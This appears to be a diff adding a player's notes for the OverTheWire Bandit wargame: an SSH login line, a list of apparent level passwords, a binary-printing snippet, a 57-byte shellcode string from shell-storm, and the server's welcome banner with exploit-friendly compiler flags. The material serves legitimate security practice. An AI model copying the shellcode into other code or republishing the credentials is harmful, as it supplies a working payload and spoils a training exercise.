@@ -1,0 +1,120 @@
+https://overthewire.org/wargames/bandit/
+ssh bandit[i]@bandit.labs.overthewire.org -p 2220
+NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
+rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
+aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
+2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
+lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
+P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
+z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
+TESKZC0XvTetK0S9xNwm25STk5iWrBvP
+EN632PlfYiZbn3PhVK3XOGSlNInNE00t
+G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
+6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
+JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
+wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
+fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq
+jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
+JQttfApK4SeyHwDlI9SXGR50qclOAil1
+hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg bandit 18
+awhqfNnAbc1naukrpqDYcF95h7HoMTrC
+VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1 bandit 26
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+AVanL161y9rsbcJIsFHuw35rjaOM19nR
+tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
+OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
+rmCBvG56y58BXzv98yZGdO7ATVL5dW8y bandit 32
+odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
+#########################
+
+// printing binary data in python3
+import sys
+sys.stdout.buffer.write(b"some binary data")
+
+#########################
+
+shellcode payload http://shell-storm.org/shellcode/files/shellcode-607.html
+57 bytes
+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
+"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x21\\x80\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\\x6b\\x0c\\x59\\x9a\\x53\\x67\\x69\\x2e\\x71\\x8a\\xe2\\x53\\x6b\\x69\\x69\\x30\\x63\\x62\\x74\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x53\\x52\\x54\\x8a\\xe2\\xce\\x81"
+
+#########################
+
+#########################
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /opt/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+ Both python2 and python3 are installed.
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
